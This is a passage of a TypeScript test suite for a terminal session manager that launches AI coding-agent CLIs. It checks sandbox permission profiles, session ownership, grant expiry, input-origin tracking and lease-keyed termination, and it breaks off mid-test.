        expect(spawned.resumeMode).toBe("exact");
        expectDarwinCodexOuterSandbox(spec);
        expect(governedCodexArgv(spec)).toEqual(
          expect.arrayContaining(["resume", providerSessionId]),
        );
        expect(config.default_permissions).toBe(
          CODEX_WORKSPACE_PERMISSION_PROFILE,
        );
        expect(config.features?.network_proxy).toBe(false);
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]?.network,
        ).toEqual({ enabled: false });
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
            ?.filesystem,
        ).toEqual(
          expect.objectContaining({
            [workspaceReal]: "write",
            [path.join(workspaceReal, ".agents")]: "deny",
            [path.join(workspaceReal, ".codex")]: "deny",
          }),
        );
      } finally {
        if (sessionId) orchKillSession(sessionId);
        setResumeSessionLookup(null);
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("rejects a persisted Pet resume whose main-owned pane seal is absent", () => {
    const root = fs.mkdtempSync(
      path.join(os.tmpdir(), "nexus-pet-resume-stale-"),
    );
    const workspace = path.join(root, "workspace");
    const runtime = path.join(root, "runtime");
    fs.mkdirSync(workspace, { recursive: true });
    const cleanupHook = installGovernedCodexTestHook(runtime);
    const h = fakeHost();
    const spawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    setResumeSessionLookup(() => "pet-provider-session");
    const authority = persistedPetStudioGrant(
      fs.realpathSync(workspace),
    );

    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          {
            kind: "cli-agent",
            paneId: "pane-pet-stale",
            resume: true,
            resumeLatestOnly: false,
            cols: 80,
            rows: 24,
          },
          makeCodexAdapter(),
          {},
          {
            ...authority,
            context: {
              ...authority.context!,
              authoritySeal: undefined,
            },
          },
        ),
      ).toThrow(/persisted Pet Studio resume.*pane seal/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      setResumeSessionLookup(null);
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")(
    "gives a pre-PREVC null/null Codex mission worker a private offline sandbox",
    () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-prevc-native-"),
      );
      const worker = path.join(root, "worker");
      const runtime = path.join(root, "runtime");
      fs.mkdirSync(worker, { recursive: true });
      const cleanupHook = installGovernedCodexTestHook(runtime);
      const h = fakeHost();
      setPtyHost(h.host);
      let sessionId: string | null = null;

      try {
        const authority = preRevisionMissionWorker(
          fs.realpathSync(worker),
        );
        const spawned = spawnAgentSession(
          fakeWc(),
          {
            kind: "cli-agent",
            paneId: "pane-before-prevc",
            cols: 80,
            rows: 24,
          },
          makeCodexAdapter(),
          {},
          authority,
        );
        sessionId = spawned.sessionId;
        const spec = h.specFor(spawned.sessionId);
        const config = parse(
          fs.readFileSync(
            path.join(spec.env.CODEX_HOME!, "config.toml"),
            "utf8",
          ),
        ) as {
          default_permissions?: string;
          features?: { network_proxy?: boolean };
          permissions?: Record<
            string,
            {
              filesystem?: Record<string, string>;
              network?: { enabled?: boolean };
            }
          >;
        };
        const workerReal = fs.realpathSync(worker);

        expectDarwinCodexOuterSandbox(spec);
        expect(spec.env.CODEX_HOME).toContain(
          `${path.sep}.nexus${path.sep}ephemeral${path.sep}mcp-clients`,
        );
        expect(config.default_permissions).toBe(
          CODEX_WORKSPACE_PERMISSION_PROFILE,
        );
        expect(config.features?.network_proxy).toBe(false);
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]?.network,
        ).toEqual({ enabled: false });
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
            ?.filesystem,
        ).toEqual(
          expect.objectContaining({
            [workerReal]: "write",
            [path.join(workerReal, ".agents")]: "deny",
            [path.join(workerReal, ".codex")]: "deny",
          }),
        );
        expect(governedCodexArgv(spec)).toEqual(
          expect.arrayContaining([
            "--ask-for-approval",
            "on-request",
            "--sandbox",
            "danger-full-access",
          ]),
        );
      } finally {
        if (sessionId) orchKillSession(sessionId);
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("fails a pre-PREVC writable mission worker closed on the coordination checkout", () => {
    const root = fs.mkdtempSync(
      path.join(os.tmpdir(), "nexus-prevc-same-root-"),
    );
    const cleanupHook = installGovernedCodexTestHook(
      path.join(root, "runtime"),
    );
    const h = fakeHost();
    const spawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    const authority = preRevisionMissionWorker(fs.realpathSync(root));

    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          {},
          {
            ...authority,
            coordinationScope: authority.scope,
            context: { ...authority.context!, isolatedWriter: true },
          },
        ),
      ).toThrow(/physically distinct execution worktree/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")(
    "keeps every non-Pet immediate Codex orchestrator read-only",
    () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-legacy-readonly-"),
      );
      const workspace = path.join(root, "workspace");
      const runtime = path.join(root, "runtime");
      fs.mkdirSync(workspace, { recursive: true });
      const cleanupHook = installGovernedCodexTestHook(runtime);
      const h = fakeHost();
      setPtyHost(h.host);
      let sessionId: string | null = null;

      try {
        const spawned = spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          {},
          missionGrant(fs.realpathSync(workspace)),
        );
        sessionId = spawned.sessionId;
        const spec = h.specFor(spawned.sessionId);
        const config = parse(
          fs.readFileSync(
            path.join(spec.env.CODEX_HOME!, "config.toml"),
            "utf8",
          ),
        ) as {
          default_permissions?: string;
          features?: { network_proxy?: boolean };
          permissions?: Record<
            string,
            {
              filesystem?: Record<string, string>;
              network?: { enabled?: boolean };
            }
          >;
        };
        const workspaceReal = fs.realpathSync(workspace);

        expect(config.default_permissions).toBe("nexus_governed_read_only");
        expect(config.features?.network_proxy).toBe(false);
        expect(
          config.permissions?.nexus_governed_read_only?.network,
        ).toEqual({ enabled: false });
        expect(
          config.permissions?.nexus_governed_read_only?.filesystem?.[
            workspaceReal
          ],
        ).toBe("read");
        expect(spec.args[1]).not.toContain(
          `(allow file-write* (subpath ${JSON.stringify(workspaceReal)})`,
        );
      } finally {
        if (sessionId) orchKillSession(sessionId);
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it.runIf(process.platform !== "linux")(
    "keeps an approved pre-freeze Codex orchestrator read-only without provider prompts",
    () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const codex = makeCodexAdapter();
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const baseAuthority = trustedSpawn();
    const authority: BoundSpawnAuthority = {
      ...baseAuthority,
      source: "pending",
      context: {
        missionId: "mission-orchestrator",
        role: "orchestrator",
        readOnly: false,
        nativeReadOnly: true,
        scope: baseAuthority.scope,
        executionScope: baseAuthority.scope,
      },
    };

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        {},
        authority,
      );

      const spec = h.specFor(spawned.sessionId);
      const args = governedCodexArgv(spec);
      if (process.platform === "darwin") {
        expectDarwinCodexOuterSandbox(spec);
        expect(args).toEqual(
          expect.arrayContaining(["--ask-for-approval", "on-request"]),
        );
      } else {
        expect(args).toEqual(
          expect.arrayContaining(["--ask-for-approval", "never"]),
        );
        expect(args).not.toContain("--sandbox");
      }
      expect(args).not.toContain(
        "--dangerously-bypass-approvals-and-sandbox",
      );
      expect(governedCodexPermissionProfile(spec)).toBe(
        "nexus_governed_read_only",
      );
    } finally {
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
    },
  );

  it("reports every scoped agent session even when the provider chooses its id", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const hook = vi.fn();
    setSessionDictationHook(hook);
    const owner = fakeWc();
    const authority = trustedSpawn();
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24, paneId: "pane-a" },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    expect(hook).toHaveBeenCalledWith({
      providerSessionId: null,
      ptySessionId: sessionId,
      adapterId: "test-cli",
      cwd: authority.cwd,
      paneId: "pane-a",
    });
    setSessionDictationHook(null);
    orchKillSession(sessionId);
  });

  it("appends adapter-declared extra args after user overrides", () => {
    const h = fakeHost();
    setPtyHost(h.host);

    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      { extraArgs: ["--disallowedTools", "Task"] },
    );

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      adapter,
      { extraArgs: ["--user-flag"] },
      trustedSpawn(),
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).toContain("--user-flag");
    expect(spec.args).toEqual(
      expect.arrayContaining([
        "--disallowedTools",
        "Task",
        "--sandbox",
        "read-only",
      ]),
    );
  });

  it("lets Kimi transient-model env choose the API model without an overriding --model", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "kimi",
      bin: "kimi",
      spawn: { ...base.spawn, interactive: ["kimi"] },
      models: {
        flag: "--model",
        list: ["kimi-code/kimi-for-coding"],
        default: "kimi-code/kimi-for-coding",
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "kimi",
        model: "kimi-code/kimi-for-coding",
        cols: 80,
        rows: 24,
      },
      adapter,
      {
        keyEnv: {
          KIMI_MODEL_API_KEY: "sk-kimi-test",
          KIMI_MODEL_NAME: "kimi-for-coding",
        },
      },
      trustedSpawn(),
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).not.toContain("--model");
    expect(spec.env.KIMI_MODEL_API_KEY).toBe("sk-kimi-test");
    expect(spec.env.KIMI_MODEL_NAME).toBe("kimi-for-coding");
  });

  it("normalizes the legacy Kimi OAuth model alias before adding --model", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "kimi",
      bin: "kimi",
      spawn: { ...base.spawn, interactive: ["kimi"] },
      models: {
        flag: "--model",
        list: ["kimi-code/kimi-for-coding"],
        default: "kimi-code/kimi-for-coding",
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "kimi",
        model: "kimi-for-coding",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );

    expect(h.specFor(sessionId).args).toEqual([
      "--model",
      "kimi-code/kimi-for-coding",
      "--sandbox",
      "read-only",
    ]);
  });

  it("passes only provider-qualified OpenCode model ids", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "opencode",
      bin: "opencode",
      spawn: { ...base.spawn, interactive: ["opencode"] },
      models: {
        flag: "--model",
        list: ["opencode/big-pickle"],
        default: "opencode/big-pickle",
      },
    };

    const valid = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "opencode",
        model: "opencode/big-pickle",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );
    const stale = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "opencode",
        model: "claude-sonnet-5",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );

    expect(h.specFor(valid.sessionId).args).toEqual([
      "--model",
      "opencode/big-pickle",
      "--sandbox",
      "read-only",
    ]);
    expect(h.specFor(stale.sessionId).args).toEqual(["--sandbox", "read-only"]);
  });

  it("requires a trusted main-side binding and never falls back to HOME", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    expect(() =>
      spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        adapter,
        {},
        undefined as never,
      ),
    ).toThrow(/trusted spawn authority/);
  });

  it("uses the canonical bound cwd even when the renderer request carries another cwd", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const trustedCwd = fs.realpathSync(process.cwd());

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        cwd: "/renderer-controlled/path",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(trustedCwd),
    );

    expect(h.specFor(sessionId).cwd).toBe(trustedCwd);
  });

  it("owns agent metadata in main and consumes mission promotion exactly once", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const baseAdapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...baseAdapter,
      quirks: { ...baseAdapter.quirks, mcpAutoload: true },
    };

    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-orchestrator",
        model: "default",
        accountId: "account-a",
        effort: "high",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    expect(getOwnedAgentSessionInfo(attacker, sessionId)).toBeNull();
    expect(getOwnedAgentSessionInfo(owner, sessionId)).toMatchObject({
      sessionId,
      paneId: "pane-orchestrator",
      adapterId: "test-cli",
      model: "default",
      accountId: "account-a",
      effort: "high",
      cwd,
      role: "orchestrator",
      squadId: "review-squad",
      source: "legacy-squad",
    });
    expect(
      consumeMissionOrchestratorGrant(attacker, sessionId, "review-squad"),
    ).toBeNull();
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "other-squad"),
    ).toBeNull();
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toMatchObject({ sessionId, squadId: "review-squad" });
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toBeNull();
    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-a")).toBe(
      true,
    );
    expect(getOwnedAgentSessionInfo(owner, sessionId)?.missionId).toBe(
      "mission-a",
    );
    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-b")).toBe(
      false,
    );

    orchKillSession(sessionId);
  });

  it("expires an unconsumed mission orchestrator promotion grant", () => {
    vi.useFakeTimers();
    vi.setSystemTime(1_000);
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const baseAdapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...baseAdapter,
      quirks: { ...baseAdapter.quirks, mcpAutoload: true },
    };
    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-expired-orchestrator",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    vi.setSystemTime(10 * 60_000);
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toBeNull();

    orchKillSession(sessionId);
    vi.useRealTimers();
  });

  it("physically terminates an abandoned immediate orchestrator when promotion expires", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: true,
        rootExited: true,
        descendantsExited: true,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const owner = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-abandoned-orchestrator",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    await vi.advanceTimersByTimeAsync(120_000);
    expect(proc.terminate).toHaveBeenCalledWith({
      termTimeoutMs: 1_500,
      killTimeoutMs: 1_500,
    });
    expect(getSessionState(sessionId)).not.toBeNull();
    expect(orchWriteSession(sessionId, "late\r")).toBe(false);

    (handlers as PtySessionHandlers | null)?.onExit(0, 15);
    await vi.advanceTimersByTimeAsync(0);
    expect(getSessionState(sessionId)).toBeNull();
    vi.useRealTimers();
  });

  it("keeps state as busy when hookState is busy, ignoring the idle timeout", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const owner = fakeWc();
    const trusted = trustedSpawn();
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trusted,
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");

    // Initial state is spawning, transitions to busy on first data
    activeHandlers.onData("hello");
    expect(getSessionState(sessionId)).toBe("busy");

    // Publish hook state as busy
    publishSessionActivityState(sessionId, "busy");
    expect(getSessionState(sessionId)).toBe("busy");

    // Advance time by the idle timeout (adapter has 500ms)
    await vi.advanceTimersByTimeAsync(1000);

    // The state should still be busy, because hookState is busy!
    expect(getSessionState(sessionId)).toBe("busy");

    // Publish hook state as idle
    publishSessionActivityState(sessionId, "idle");
    expect(getSessionState(sessionId)).toBe("idle");

    killSession(owner, sessionId);
    vi.useRealTimers();
  });

  it("does not re-emit stateChange when hook re-asserts the same state", () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      trustedSpawn(),
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");
    activeHandlers.onData("hello");
    expect(getSessionState(sessionId)).toBe("busy");

    send.mockClear();
    expect(publishSessionActivityState(sessionId, "busy")).toBe(true);
    expect(publishSessionActivityState(sessionId, "busy")).toBe(true);
    const stateSends = send.mock.calls.filter(
      (call) => call[0] === "pty:stateChange",
    );
    expect(stateSends).toHaveLength(0);

    killSession(owner, sessionId);
  });

  it("tracks renderer keyboard writes as human and main-owned writes as system", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    expect(getLastSessionInputOrigin(sessionId)).toBeUndefined();

    expect(writeSession(owner, sessionId, "typed by user")).toBe(true);
    expect(getLastSessionInputOrigin(sessionId)).toBe("human");

    expect(orchWriteSession(sessionId, "pane_write")).toBe(true);
    expect(getLastSessionInputOrigin(sessionId)).toBe("system");

    expect(
      orchWriteSession(sessionId, "explicit", { inputOrigin: "human" }),
    ).toBe(true);
    expect(getLastSessionInputOrigin(sessionId)).toBe("human");

    killSession(owner, sessionId);
  });

  it("publishes keyboard and main-owned writes to input taps without altering the write", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    const seen: Array<[string, string, string]> = [];
    const untap = tapSessionInput((id, data, origin) =>
      seen.push([id, data, origin]),
    );

    expect(writeSession(owner, sessionId, "oi\r")).toBe(true);
    expect(orchWriteSession(sessionId, "injetado\r")).toBe(true);
    expect(
      orchWriteSession(sessionId, "operador\r", { inputOrigin: "human" }),
    ).toBe(true);

    expect(seen).toEqual([
      [sessionId, "oi\r", "human"],
      [sessionId, "injetado\r", "system"],
      [sessionId, "operador\r", "human"],
    ]);

    // Escrita vazia não gera evento — nada chegou ao PTY.
    seen.length = 0;
    writeSession(owner, sessionId, "");
    expect(seen).toEqual([]);

    // Desinscrever de fato silencia o observador.
    untap();
    writeSession(owner, sessionId, "depois\r");
    expect(seen).toEqual([]);

    killSession(owner, sessionId);
  });

  it("keeps the session writable when an input tap throws", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    const untap = tapSessionInput(() => {
      throw new Error("observador quebrado");
    });

    // Um cronômetro com defeito não pode derrubar o terminal do usuário.
    expect(() => writeSession(owner, sessionId, "sobrevive\r")).not.toThrow();
    expect(writeSession(owner, sessionId, "ainda escreve\r")).toBe(true);
    expect(orchWriteSession(sessionId, "e o main tambem\r")).toBe(true);

    untap();
    killSession(owner, sessionId);
  });

  it("does not leak writes from a session an input tap is not entitled to see", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const trusted = trustedSpawn();
    const first = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const second = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    const seen: string[] = [];
    const untap = tapSessionInput((id) => seen.push(id));

    writeSession(owner, first.sessionId, "a\r");
    writeSession(owner, second.sessionId, "b\r");

    // Cada evento carrega a sessão exata: o consumidor particiona por
    // autoridade, e nunca recebe um write sem saber de quem é.
    expect(seen).toEqual([first.sessionId, second.sessionId]);

    untap();
    killSession(owner, first.sessionId);
    killSession(owner, second.sessionId);
  });

  it("supports passive orchestration writes whose busy proof comes from PTY output", () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const owner = fakeWc();
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      trustedSpawn(),
    );
    publishSessionActivityState(sessionId, "idle");

    expect(
      orchWriteSession(sessionId, "kickoff\r", { markInputBusy: false }),
    ).toBe(true);
    expect(getSessionState(sessionId)).toBe("idle");
    (handlers as PtySessionHandlers | null)?.onData("accepted");
    expect(getSessionState(sessionId)).toBe("busy");

    killSession(owner, sessionId);
  });

  it("releases a stale hook busy after the watchdog window when no idle arrives", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const owner = fakeWc();
    const trusted = trustedSpawn();
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24 },
      adapter,
      {},
      trusted,
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");

    activeHandlers.onData("hello");
    publishSessionActivityState(sessionId, "busy");

    // The idle timeout passes but the hook still says busy → stays busy.
    await vi.advanceTimersByTimeAsync(1000);
    expect(getSessionState(sessionId)).toBe("busy");

    // No idle hook ever arrives (agent killed / Stop hook lost). Past the
    // watchdog window the stuck busy is released so the quiet session settles.
    await vi.advanceTimersByTimeAsync(6 * 60_000);
    expect(getSessionState(sessionId)).toBe("idle");

    killSession(owner, sessionId);
    vi.useRealTimers();
  });

  describe("Session Lease Registry & startKey lifecycle in pty-manager", () => {
    it("spawns with a startKey and allows orchKillSession with matching startKey", async () => {
      const h = fakeHost();
      setPtyHost(h.host);
      const trusted = trustedSpawn();
      const spawned = spawnSession(
        fakeWc(),
        { kind: "shell", cols: 80, rows: 24 },
        { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
      );

      expect(spawned.startKey).toBeDefined();
      expect(typeof spawned.startKey).toBe("string");

      const lease = inspectSessionLease(spawned.sessionId);
      expect(lease).not.toBeNull();
      expect(lease?.startKey).toBe(spawned.startKey);

      // Kill with matching startKey succeeds
      const killed = orchKillSession(spawned.sessionId, {
        startKey: spawned.startKey,
      });
      expect(killed).toBe(true);
      await orchTerminateSession(spawned.sessionId);
      expect(getSessionState(spawned.sessionId)).toBeNull();
    });

    it("refuses orchKillSession when startKey is omitted or mismatched, but allows force", async () => {
      const h = fakeHost();
      setPtyHost(h.host);
      const trusted = trustedSpawn();
      const spawned = spawnSession(
        fakeWc(),
        { kind: "shell", cols: 80, rows: 24 },
        { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
      );

      // Omitted startKey
      const refusedNoKey = orchKillSession(spawned.sessionId);
      expect(refusedNoKey).toBe(false);

      // Mismatched startKey
      const refusedMismatch = orchKillSession(spawned.sessionId, {
        startKey: "sk_fake_key_1234",
      });
      expect(refusedMismatch).toBe(false);

      // Session is still alive
      expect(getSessionState(spawned.sessionId)).not.toBeNull();

      // Human operator bypass with force: true succeeds
      const forceKilled = orchKillSession(spawned.sessionId, { force: true });
      expect(forceKilled).toBe(true);
      await orchTerminateSession(spawned.sessionId);
      expect(getSessionState(spawned.sessionId)).toBeNull();
    });
  });
});


describe('F-567 spawn contracts', () => {
  (process.platform === 'darwin' ? it : it.skip).each([
    ['droid', 'HOME', '.factory'],
    ['hermes', 'HERMES_HOME', '.hermes'],
    ['prime-agent', 'PRIME_AGENT_SESSION_DIR', '.prime/agent'],
  ])('keeps %s checkout env under Seatbelt and grants only exact shared files', async (kind, envKey, profile) => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'f567-tui-sandbox-'));
    const home = path.join(root, 'native');
    const profileDir = path.join(home, profile);
    const worktree = path.join(root, 'worktree');
    const runtime = path.join(root, 'runtime');
    const binary = path.join(root, 'cli');
    fs.mkdirSync(profileDir, { recursive: true });
    fs.mkdirSync(worktree);
    fs.mkdirSync(runtime);
    fs.writeFileSync(binary, '#!/bin/sh\n');
    fs.chmodSync(binary, 0o755);
    const auth = path.join(profileDir, 'auth.json');
    fs.writeFileSync(auth, '{"fixture":true}');
    vi.stubEnv('HOME', home);
    vi.stubEnv('USERPROFILE', home);
    const host = fakeHost();
    setPtyHost(host.host);
    setAgentSpawnHook(() => ({ authorityToken: 'f567-tui-sandbox', env: {}, extraArgs: [], processHome: home, sandboxDir: runtime }));
    const base = revisionBoundWorker(fs.realpathSync(worktree));
    const authority = { ...base, scope: { ...base.scope, checkoutId: path.basename(root) }, context: { ...base.context!, readOnly: true, nativeReadOnly: false } };
    const stateRoot = path.join(app.getPath('userData'), 'provider-state', kind, authority.scope.checkoutId);
    let sessionId: string | undefined;
    try {
      const adapter = { ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }), id: kind };
      ({ sessionId } = spawnMainOwnedAgentSession({ kind: 'cli-agent', paneId: `tui-sandbox-${kind}`, cols: 80, rows: 24 }, adapter, { binPath: binary }, authority));
      const spec = host.specFor(sessionId);
      expect(spec.file).toBe('/usr/bin/sandbox-exec');
      expect(fs.realpathSync(spec.env[envKey]!)).toContain(fs.realpathSync(stateRoot) + path.sep);
      const policy = spec.args[1];
      expect(policy).toContain(JSON.stringify(fs.realpathSync(stateRoot)));
      if (kind !== 'prime-agent') expect(policy).toContain(JSON.stringify(fs.realpathSync(auth)));
      expect(policy).not.toContain(`(subpath ${JSON.stringify(fs.realpathSync(profileDir))})`);
      expect(policy).not.toContain(`(subpath ${JSON.stringify(fs.realpathSync(home))})`);
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      setAgentSpawnHook(null);
      vi.unstubAllEnvs();
      fs.rmSync(root, { recursive: true, force: true });
      fs.rmSync(stateRoot, { recursive: true, force: true });
    }
  });

  it.each([
    ['droid', 'HOME', '.factory', 'sessions/chat.jsonl'],
    ['hermes', 'HERMES_HOME', '.hermes', 'state.db'],
